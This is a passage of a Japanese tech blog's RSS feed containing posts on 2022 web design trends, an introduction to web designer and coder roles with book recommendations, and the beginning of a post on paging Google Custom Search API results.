>グラスモーフィズム&lt;/a> とは、その名の通り、画面がガラスでできている、あるいはガラスで覆われているかのように見せる技術で、一般的にはユーザーインターフェイスの背景をぼかすために使用されます。2022年には、デザイナーがガラスのようなアニメーションオブジェクトやテキストを作成し、フロントエンドの境界を押し広げることで、このトレンドはさらに人気を集めると思われます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 248;
flex-basis: 595px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/dovetail-digital.png" data-size="1568x632">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/dovetail-digital.png"
width="1568"
height="632"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>デジタル製品エージェンシーの &lt;a class="link" href="https://dovetailstudios.com/" target="_blank" rel="noopener"
>Dovetail Studios&lt;/a> は、異なる角度で回転する入れ子のリングのGlassmorphicセットをアニメーション化しました。目を引くとともに、彼らの3Dモデリング能力の高さがうかがえます。サイト内の他のアイコンも、この効果を反映しています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 224;
flex-basis: 539px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/lo-and-behold.png" data-size="1568x697">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/lo-and-behold.png"
width="1568"
height="697"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>同じくデジタル・クリエイティブ・エージェンシーの&lt;a class="link" href="https://loandbehold.studio/" target="_blank" rel="noopener"
>Lo and Behold Studios&lt;/a> も、ホームページでGlassmorphicのアニメーション・オブジェクトを使用しています。しかし、全体的に明るいテーマであるため、ユーザーがDovetailのサイトを見たときに感じる印象とはまったく異なるものとなっています。&lt;/p>
&lt;h2 id="クリエイティブなスクロール効果">クリエイティブなスクロール効果&lt;/h2>
&lt;p>多くのデザイナーは、昨年の横スクロールのトレンドを発展させ、さらにスクロールの効果を試しています。水平、横、多方向のいずれであっても、ユーザーがサイト内を移動する方向を変えることは、全体としてよりダイナミックな体験をユーザーに与える簡単な方法です。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 194;
flex-basis: 465px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/moooi.png" data-size="1215x626">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/moooi.png"
width="1215"
height="626"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>オランダの家具メーカー &lt;a class="link" href="https://www.moooi.com/us/a-life-extraordinary" target="_blank" rel="noopener"
>Moooi&lt;/a> は、ユーザーがスクロールするにつれて、コレクションの奥深くに入り込んでいきます。同社のサイトでは、3つの体験ができます。美しく咲き、重力に逆らっていくまるで紙芝居のような体験です。それぞれ、画面を開くとコレクションが次々と現れ、スクロールするたびに新しいパターンや飾り模様に飛び込んでいきます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 273;
flex-basis: 655px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/kayla-fisher-screenshot-7.png" data-size="784x287">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/kayla-fisher-screenshot-7.png"
width="784"
height="287"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>写真家のKayla Fisherさんの &lt;a class="link" href="https://kaylafisherphotography.com/" target="_blank" rel="noopener"
>サイト&lt;/a> では、サイドバイサイドスクロールで、メニューは画面の左側にべったりと配置されています。これによって、ユーザーにより深く入り込んでもらうための大きなボタンを見失うことなく、視覚的に魅力的な方法で彼女の作品を見ることができます。&lt;/p>
&lt;h2 id="特大のタイポグラフィ">特大のタイポグラフィ&lt;/h2>
&lt;p>ウェブサイトは、企業としてのあり方を大胆に表現するものであるべきです。多くの企業がこの考えを真摯に受け止め、見出しに特大のタイポグラフィを使用したり、ヒーロー画像（キャッチ画像）の代わりに使用したりしています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 195;
flex-basis: 468px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/humain.png" data-size="1185x607">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/humain.png"
width="1185"
height="607"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>テクノロジー研究集団 &lt;a class="link" href="https://www.humain.ai/" target="_blank" rel="noopener"
>HUMAIN&lt;/a> は、人間の体験と技術革新の間のギャップを埋めるために活動しています。クロノス・グループの支援を受け、オンラインと生活の両方で人間の経験を向上させるために新技術を使用する新しい方法を見つけることを目的としています。複雑なストーリーを持つこの企業は、ヒーロー画像の代わりにテキストを使用することで、サイトに入った瞬間からその使命を訴えています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 250;
flex-basis: 601px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/aiaiai.png" data-size="1236x493">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/aiaiai.png"
width="1236"
height="493"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>ヘッドホンといえば、視覚的なものと同じくらい聴覚的なアイデアが思い浮かびます。ヘッドホンメーカーの &lt;a class="link" href="https://aiaiai.audio/" target="_blank" rel="noopener"
>AIAIAI&lt;/a> の社名は、名前と同じくらい感嘆詞で、サイトを訪れたユーザーに大胆な主張を叫んでいます。大きなテキストで会社を紹介した後、折り返しのすぐ下の小さなヒーローに隣接した動画が表示され、ヒーロー画像→テキストという従来のパターンを崩しているのです。&lt;/p>
&lt;h2 id="可視化された境界線">可視化された境界線&lt;/h2>
&lt;p>目に見えるボーダーは、デザインに構造を与え、コンテンツを通してユーザーの注意を引きつけます。シンプルな線だけで構成されるボーダーは、整然としたサイトを必要とするクライアント向けのデザインに役立ちます。一方、ファンキーでインタラクティブなボーダーは、大胆な色使いやインタラクティブな効果によって、オンライン訪問者にさらなる視覚的な興味を与えることができます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 194;
flex-basis: 465px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/bonjour-paris.png" data-size="1110x572">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/bonjour-paris.png"
width="1110"
height="572"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>独立機関である &lt;a class="link" href="https://bonjour.paris/en" target="_blank" rel="noopener"
>Bonjour Paris&lt;/a> は、可視化されたボーダーと水平スクロールを組み合わせることで、ミニマルでありながら興味をそそるサイトになっています。線状のボーダーは、サイト全体からプロジェクトセクションまで続き、曖昧で忙しい印象を与えることなく、新しい形を生み出しています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 196;
flex-basis: 470px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/curry-cafe.png" data-size="1568x799">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/curry-cafe.png"
width="1568"
height="799"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>オーストラリアのレストラン「Curry Cafe」は2つの店舗を持ち、サイトのスクロールボーダーは、ユーザーがカラフルで魅力的な他のコンテンツを消費するための強固なフレームワークを提供します。&lt;/p>
&lt;h2 id="抽象的なビジュアルを持つコラージュ部品">抽象的なビジュアルを持つコラージュ部品&lt;/h2>
&lt;p>ウェブが始まってから、私たちは長い道のりを歩んできました。あるデザイナーは構造化された美学を受け入れ、またあるデザイナーは逆の方向に進んでいます。大胆な色使い、重なり合う画像、複数のテクスチャーなど、それぞれの要素が丁寧にデザインされていれば、シームレスに融合することができるのです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 211;
flex-basis: 507px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/illuminating-radioactivity.png" data-size="1234x583">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/illuminating-radioactivity.png"
width="1234"
height="583"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>&lt;a class="link" href="https://illuminating-radioactivity.com/" target="_blank" rel="noopener"
>Illuminating Radioactivity&lt;/a> は、 &lt;a class="link" href="https://www.stimson.org/" target="_blank" rel="noopener"
>スティムソンセンター&lt;/a> 、 &lt;a class="link" href="https://reinventingcivildefense.org/" target="_blank" rel="noopener"
>Reinventing Civil Defenseプロジェクト&lt;/a> 、 [Bombshelltoe Policy x Arts Collective]https://bombshelltoe.com/ が共同で作成した教育用ウェブサイトです。放射能」という言葉の歴史や意味、私たちの連想、そして放射能が科学、娯楽、医療などの分野でどのような役割を担ってきたのかが紹介されています。スクロールすると、歴史を物語る古い写真と、鮮やかで抽象的な形状の組み合わせが目に飛び込んできます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 188;
flex-basis: 453px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/loved-up-co.png" data-size="1313x695">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-02-wyoshi/loved-up-co.png"
width="1313"
height="695"
loading="lazy"
alt="2022年のWebデザインの最新トレンドとレイアウトの画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>オーストラリアのThe Loved Up Coは、パートナーとの夜の生活に必要なものがすべて揃った便利なキットで、デートの夜を華やかにするお手伝いをしています。ホームページでは、白黒写真のボディに、笑顔の口元や花、カクテルを組み合わせたコラージュ風の人物を掲載。また、抽象的な形や円、ジグソーパズルを随所に配し、コンテンツの中で視線を動かし続けています。&lt;/p>
&lt;h2 id="ウェブの未来をデザインする">ウェブの未来をデザインする&lt;/h2>
&lt;p>これらのトレンドに注目し、気になるコンセプトを試してみてはいかがでしょうか。2022年のウェブデザインのトレンドは、昨年のトレンドの延長線上にあることにお気づきの方もいらっしゃるのではないでしょうか。&lt;/p>
&lt;p>気に入ったものはありましたか？私たちが見逃しているものがあれば、教えてください。そして、残るスタイルも流行り廃りも、デザイナーが今年、クライアントと一緒に何を作るかにかかっていることを忘れないでください。&lt;/p></description></item><item><title>第0回のテーマ「Webデザイナー、コーダーってなに？」</title><link>https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/</link><pubDate>Thu, 20 Jan 2022 14:10:38 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/catch.png" alt="Featured image of post 第0回のテーマ「Webデザイナー、コーダーってなに？」" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>「未経験でもWebデザイナー、コーダーになろう」ではWebデザイナーやコーダーなどWeb業界を目指す方に、現役Webデザイナー兼コーダーができるだけわかりやすく、Webサイトをデザインしたり、作ったりする方法は情報を伝える講座です。&lt;br>
初心者の方、そうでない方など、いろいろな方大歓迎です。&lt;br>
まずはWebデザイナーやコーダーと言われる人たちがいる、Web業界の実際はこうだよというのをお伝えします。&lt;/p>
&lt;h3 id="web業界に入るためには未経験だと厳しい">Web業界に入るためには未経験だと厳しい？&lt;/h3>
&lt;ul>
&lt;li>未経験だと厳しい？&lt;/li>
&lt;li>学校で習わないと難しそう。&lt;/li>
&lt;/ul>
&lt;p>このようなことを思っているかもしれません。しかし、そんなことなありません。&lt;br>
Webで働いてみたいという気持ちとポートフォリオと呼ばれる作品集。&lt;br>
なにより少しでもできるてしまえば、入れる業界だと思います。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 150;
flex-basis: 360px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img04.jpg" data-size="980x653">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img04.jpg"
width="980"
height="653"
loading="lazy"
alt="&amp;#34;&amp;#34;"
>
&lt;/a>
&lt;/a>
&lt;figcaption>&amp;quot;&amp;quot;&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h3 id="初期費用が色々かかる">初期費用が色々かかる？&lt;/h3>
&lt;ul>
&lt;li>パソコンを用意&lt;/li>
&lt;li>Photoshopなどの高いアプリを買う必要がある&lt;/li>
&lt;/ul>
&lt;p>こういったことで、初期費用が色々かかるかと思っている人も多いと思います。&lt;br>
今の時代は様々なWebサービスを駆使していろいろなことが無料でできます。&lt;/p>
&lt;p>もちろん、パソコンを持っていたほうが作業は簡単かもしれませんが、iPhoneやiPad、廉価なChromeBookやWindowsなどでもデザインからコーディングまでできてしまいます。&lt;br>
特にiPhoneやiPadはデザインに特化することができると思います。&lt;/p>
&lt;p>そういったサービスやコンテンツ、アプリを使用してデザインからコーディングを行って誰でも簡単に自分のサイトを持つことができるようになりました。&lt;br>
ほんといい時代になりましたね。&lt;/p>
&lt;h2 id="webデザイナーとは">WEBデザイナーとは&lt;/h2>
&lt;p>Webデザイナーと聞いてイメージするのは&lt;/p>
&lt;ul>
&lt;li>カッコいいサイトをデザインしている人&lt;/li>
&lt;li>美的センスがいりそう&lt;/li>
&lt;li>Photoshopを使ってデザインをしている&lt;/li>
&lt;/ul>
&lt;p>と思うかもしれません。しかし、それが重要だと私は思いません。&lt;br>
もっと重要なのは「情報をわかりやすくして、配置する力」ではないかと思います。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 177;
flex-basis: 426px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img01.jpg" data-size="980x551">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img01.jpg"
width="980"
height="551"
loading="lazy"
alt="&amp;#34;&amp;#34;"
>
&lt;/a>
&lt;/a>
&lt;figcaption>&amp;quot;&amp;quot;&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h3 id="webデザイナーとは情報をわかりやすくして配置する人">WEBデザイナーとは「情報をわかりやすくして、配置する人」&lt;/h3>
&lt;p>Webデザイナーと一般的なデザイナーの違いは「Webデザイナーは何かを表現するものではない」と言う点だと思います。&lt;br>
「Webデザイナーは情報をわかりやすくして、配置する人」こういうものではないかなと私は考えてます。&lt;/p>
&lt;p>デザインする上で、大事なのはそれぞれの関係性はどうなっているかです。&lt;br>
それをわかりやすく伝える、そのためには関連性があるものは近くにあったほうがいい。&lt;br>
そうやって散らばっている情報と情報をつなげていく。それがWebデザイナーではないかと思います。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 149;
flex-basis: 359px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img02.jpg" data-size="980x654">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img02.jpg"
width="980"
height="654"
loading="lazy"
alt="&amp;#34;&amp;#34;"
>
&lt;/a>
&lt;/a>
&lt;figcaption>&amp;quot;&amp;quot;&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h3 id="webコーダーはwebデザインを表示して使い勝手を作る人">Webコーダーは「Webデザインを表示して、使い勝手を作る人」&lt;/h3>
&lt;p>WebコーダーはWebデザインを実際にHTMLと言われる言語に書き換えて、CSSと呼ばれる言語でHTMLをお化粧していきます。&lt;/p>
&lt;p>お化粧をしていく上で大事なのはGoogleやBingのクローラーと呼ばれるプログラムに拾われやすくするということを意識しなければなりません。&lt;br>
これを &lt;strong>SEO&lt;/strong> といいますが、今は知らなくても大丈夫です。&lt;br>
簡単に言えば、ネットという広い海に出すためにわかりやすい地図を作ってくれる人にわかりやすく伝えるということです。&lt;/p>
&lt;p>デザイナーは見た目を作っていきますが、コーダーは使い勝手を作っていると言ってもいいのかもしれません。&lt;/p>
&lt;p>その他にも、Javascriptと呼ばれる言語を使って動きやいろいろな処理を行う場合もあります。&lt;/p>
&lt;h2 id="webデザイナーとコーダーは別のほうがいい">Webデザイナーとコーダーは別のほうがいい？&lt;/h2>
&lt;p>Webデザイナーとコーダーが別々の作業を行って、もう片方の仕事内容を知らないでもいいかといえば、そうではありません。相互に理解していたほうがいいと思います。&lt;/p>
&lt;h3 id="webデザイナーがコーディングを知らない場合">Webデザイナーがコーディングを知らない場合&lt;/h3>
&lt;p>例えば、Webデザイナーがボタンを押したときや開閉機能をつけたときの挙動をデザインしたとします。その場合の動作は誰が考えるのでしょう？&lt;br>
多くの場合はデザイナーの頭の中に「ふわっと出したい」や「回転しながら出したい」といった考えがあるかと思います。スライドするコンテンツについても同様です。&lt;br>
その際に、コーディングを知らなかったら指示を出せずに、コーダーの解釈でデザインが行われてしまいます。&lt;/p>
&lt;h3 id="webコーダーがデザインを知らない場合">Webコーダーがデザインを知らない場合&lt;/h3>
&lt;p>逆にコーダーがデザインを知らないと、どうでしょうか。&lt;br>
小さなデザインを見落として、デザイナーが作ったものと違うものが出来上がってしまうかもしれません。&lt;br>
小さなデザインだったら気にならないのでは？と思うかもしれませんが、デザインではその違いが大きな違いにつながったりします。&lt;/p>
&lt;h3 id="お互いに知ることが大事">お互いに知ることが大事&lt;/h3>
&lt;p>お互いのことを知っていることで、仕事の効率も上がると思いますし、デザイナーはそのうち「自分で書いたほうがより良いデザインができる」と考え、コーダーは「なんかデザインがおかしいから、デザインから自分でやってみる」といったことも往々にしてあります。&lt;br>
わたしはそうでした。&lt;/p>
&lt;p>特にWebのコンテンツはいろいろなことができてしまうので、知っているのと知らないのでは雲泥の差になります。&lt;/p>
&lt;div class="tips-area info">
&lt;dl>
&lt;dt>両方できるメリット&lt;/dt>
&lt;dd>Webデザインとコーディングが両方できると、なんとアプリを作ることができてしまいます。なので、自分の力を増やしていくために、片方だけではなくデザインとコーディング、両方の力を養っていったほうが断然いいですね。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 150;
flex-basis: 360px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img03.jpg" data-size="980x653">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-20-01-wyoshi/img03.jpg"
width="980"
height="653"
loading="lazy"
alt="&amp;#34;&amp;#34;"
>
&lt;/a>
&lt;/a>
&lt;figcaption>&amp;quot;&amp;quot;&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="webデザイナーとコーダーに重要なこと">Webデザイナーとコーダーに重要なこと&lt;/h2>
&lt;p>Webデザイナーとコーダーになる上で特に大事なことが2点あります。&lt;/p>
&lt;ul>
&lt;li>サイトのターゲットは誰なのか&lt;/li>
&lt;li>サイトの最終的なゴール地点はどこなのか&lt;/li>
&lt;li>サイトの使い勝手はいいか&lt;/li>
&lt;li>必要としている情報に簡単にアクセスできるか&lt;/li>
&lt;li>サイトのやブランドの持つイメージ&lt;/li>
&lt;/ul>
&lt;p>上記のようなことに注意して、デザインやコーディングを行っていく必要があります。&lt;/p>
&lt;p>例えば、若者向けのサイトなのに、すごく文字が大きかったり、その逆などは使う側にとってのストレスとなってしまいます。&lt;br>
デザインで言えば &lt;strong>配色&lt;/strong> や &lt;strong>文字サイズ&lt;/strong> には特に気をつける必要があります。&lt;br>
コーダーで言えば &lt;strong>対象としているブラウザで崩れがないか&lt;/strong> や &lt;strong>動きがうるさくないか&lt;/strong> といったことに気をつける必要があります。&lt;/p>
&lt;div class="tips-area info">
&lt;dl>
&lt;dt>UXとは？&lt;/dt>
&lt;dd>UX（User eXperience）といいます。日本語ではユーザー体験となりますね。ユーザーのストレスにならないようにすることを、Webを通してユーザーに快適な空間や体験を与えるということです。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="次回の予定">次回の予定&lt;/h2>
&lt;p>次回からはまず、簡単なWebデザインをしていきたいと思います。&lt;br>
といっても、いきなりデザインを行うのは大変なのでまずは既存のサイトや、簡単な1ページのサイトの大枠を作成できたらなと思います。&lt;/p>
&lt;p>それではまたの講座で会いましょう。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/HTML-CSS%e3%81%a8Web%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3%e3%81%8c1%e5%86%8a%e3%81%a7%e3%81%8d%e3%81%a1%e3%82%93%e3%81%a8%e8%ba%ab%e3%81%ab%e3%81%a4%e3%81%8f%e6%9c%ac-%e5%a2%97%e8%a3%9c%e6%94%b9%e8%a8%82%e7%89%88-%e6%9c%8d%e9%83%a8-%e9%9b%84%e6%a8%b9/dp/4297125102/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51isr1Hz2BL.jpg" alt=" HTML&amp;amp;CSSとWebデザインが1冊できちんと身につく本[増補改訂版] ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> HTML&amp;amp;CSSとWebデザインが1冊できちんと身につく本[増補改訂版] &lt;/h2>
&lt;p> 美しいデザインでサイト制作の知識とワザが「1冊で」身につく本格入門! PC&amp;amp;モバイルサイトデザインの基礎力とHTML・CSSコーディングの知識が1冊で同時に身につく! ウェブ制作を仕事にするならHTMLとCSSを学ぶことから始めますが、本書は体系立てた文法学習よりも、まずは「コーディングとはどのような作業なのか」を理解できる初学者向け入門書です。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/1%e5%86%8a%e3%81%a7%e3%81%99%e3%81%b9%e3%81%a6%e8%ba%ab%e3%81%ab%e3%81%a4%e3%81%8fHTML-CSS%e3%81%a8Web%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b3%e5%85%a5%e9%96%80%e8%ac%9b%e5%ba%a7-Mana/dp/4797398892/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51xAu2jeqrL.jpg" alt=" 1冊ですべて身につくHTML &amp;amp; CSSとWebデザイン入門講座 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 1冊ですべて身につくHTML &amp;amp; CSSとWebデザイン入門講座 &lt;/h2>
&lt;p> 【全国の書店員さんがオススメする本「CPU大賞」第1位受賞!】
&lt;p>ずっと、一番売れているHTML本!&lt;br>
Web界隈やデザイナーに大人気! Web関連の情報やデザインについて記事が学べる『Webクリエイターボックス』の管理人、 Manaによる渾身のHTML &amp;amp; CSSとWebデザインが学べる本です。&lt;br>
著者は、カナダやオーストラリア、イギリスの企業でWebデザイナーとして働き、現在は全国各地でWeb関連のセミナーに登壇し、Webサイト制作のインストラクターとして教育に携わっている。ブログ「Webクリエイターボックス」は2010年日本のアルファブロガーアワードを受賞。&lt;/p>&lt;br>
&lt;span class="link">Amazonで詳細を見る&lt;/span>&lt;br>
&lt;/div>&lt;br>
&lt;/a>&lt;br>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>&lt;/p>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%81%93%e3%82%8c%e3%81%a0%e3%81%91%e3%81%a7%e5%9f%ba%e6%9c%ac%e3%81%8c%e3%81%97%e3%81%a3%e3%81%8b%e3%82%8a%e8%ba%ab%e3%81%ab%e3%81%a4%e3%81%8f-HTML-Web%e3%83%87%e3%82%b6%e3%82%a4%e3%83%b31%e5%86%8a%e7%9b%ae%e3%81%ae%e6%9c%ac-Capybara-Design/dp/4798170119/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-na.ssl-images-amazon.com/images/I/51iJCT7O&amp;#43;YL.jpg" alt=" これだけで基本がしっかり身につく HTML/CSS&amp;amp;Webデザイン1冊目の本 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> これだけで基本がしっかり身につく HTML/CSS&amp;amp;Webデザイン1冊目の本 &lt;/h2>
&lt;p> Webサイト制作をこれから学ぶ人へ送る “1冊目&amp;#34;に最適の入門書!
&lt;p>【学びをサポートする4大特典つき】&lt;/p>
&lt;p>本書は手を動かしてWebサイトを作りながら HTML/CSSとWebデザインの基本を楽しく学べる入門書です。&lt;/p>
&lt;p>初学者が1冊目に読む本としてふさわしい内容を盛り込んでいるため、これを読めば必要な基礎知識がひととおり身につきます。 &lt;/p>&lt;br>
&lt;span class="link">Amazonで詳細を見る&lt;/span>&lt;br>
&lt;/div>&lt;br>
&lt;/a>&lt;br>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>&lt;/p>
&lt;/aside></description></item><item><title>e-Stat でGoogle Custom Search APIを使おう（２）</title><link>https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/</link><pubDate>Wed, 19 Jan 2022 18:31:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/anal.jpg" alt="Featured image of post e-Stat でGoogle Custom Search APIを使おう（２）" />&lt;h2 id="google-custom-search-api-10件目以降の取得方法について">Google Custom Search API 10件目以降の取得方法について&lt;/h2>
&lt;p>「木材流通統計調査」をgoogleで検索してみると最初の方は、政府関係の木材流通統計調査の概要説明などが上位に並んでいる感じです。&lt;br>
そういったものからは木材流通統計調査の社会的関心がある項目を抽出することは難しそうです。&lt;br>
２０件目超えたあたりに以下の記事が来ました。&lt;/p>
&lt;p>ビジネス特集 木材が消えた？身近に迫る “ウッドショック”&lt;br>
2021/06/01 — 【NHK】世界的に木材の価格が高騰している。 &amp;hellip; 農林水産省の「木材流通統計調査」によると、4月の「杉の丸太」の価格は去年の同じ月と比べて10％ &amp;hellip;&lt;br>
22/01/19 にこのページにアクセスしました。&lt;/p>
&lt;p>ここから「丸太の価格」などの高騰が「ウッドショック」と呼ばれる社会的現象を起こしていることがわかります。&lt;/p>
&lt;p>Google Custom Search APIは10件までしか結果を取得しないので、10件目以降の結果を取得する必要がありそうです。&lt;br>
眺めてみると50件くらい取得すれば良さそうです。&lt;/p>
&lt;p>Google Custom Search APIの10件目以降を取得する方法はクエリのパラメータ startに開始位置を設定すれば良さそうです。&lt;br>
最大100件目まで取得できるみたいです（10件ずつなのでstartの値を変えて10回叩く必要がありますね）。&lt;/p>
&lt;p>&lt;a class="link" href="https://developers.google.com/custom-search/v1/reference/rest/v1/cse/list" target="_blank" rel="noopener"
>https://developers.google.com/custom-search/v1/reference/rest/v1/cse/list&lt;/a>&lt;/p>
&lt;p>The index of the first result to return. The default number of results per page is 10, so &amp;amp;start=11 would start at the top of the second page of results. Note: The JSON API will never return more than 100 results, even if more than 100 documents match the query, so setting the sum of start + num to a number greater than 100 will produce an error. Also note that the maximum value for num is 10.&lt;/p>
&lt;p>curlで叩くと以下の方法になります。&lt;/p>
&lt;pre tabindex="0">&lt;code>curl 'https://www.googleapis.com/customsearch/v1?key=xxxxxxxxxxxxxxxx&amp;amp;cx=xxxxxxxxxxxxxxxxx&amp;amp;q=木材流通統計調査&amp;amp;start=11'
&lt;/code>&lt;/pre>&lt;h2 id="google-custom-search-api-検索対象をnewsだけに絞り込めないか">Google Custom Search API 検索対象をnewsだけに絞り込めないか&lt;/h2>
&lt;p>しかし、よくよく考えてみると社会的関心の高い項目を抽出しようと思ったらニュースなどに検索結果を絞り込んだほうが良い気がして来ました。&lt;br>
google検索結果のニュースタブをクリックして出て来た結果の方が使えそうです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 159;
flex-basis: 383px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/news.png" data-size="980x613">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-19-02-ani/news.png"
width="980"
height="613"
loading="lazy"
alt="ニュース"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ニュース&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>ニュースだと「ビジネス特集 木材が消えた？身近に迫る “ウッドショック”」が上位に来ていますし、以下のような興味深い記事もすぐ出て来ます。&lt;/p>
&lt;p>ウッドショックはいつ収まるのか？ 住宅価格への影響は？ 木材価格高騰の直接原因と根本原因～時事解説&lt;/p>
&lt;p>輸入材不足の余波で国産材の価格は春先から上昇を続けてきた。農林水産省の木材流通統計調査によると、9月の丸太価格は杉が前年同月比2.4倍、檜は2.9倍の水準だ。木材の使用量で差はあるが、住宅1棟につき少なくとも数十万円以上のコスト増が主に中小工務店らの経営に重くのしかかる。&lt;/p>
&lt;p>Google Custom Search API でnewsだけに検索結果を絞り込む方法を調べてみました。&lt;br>
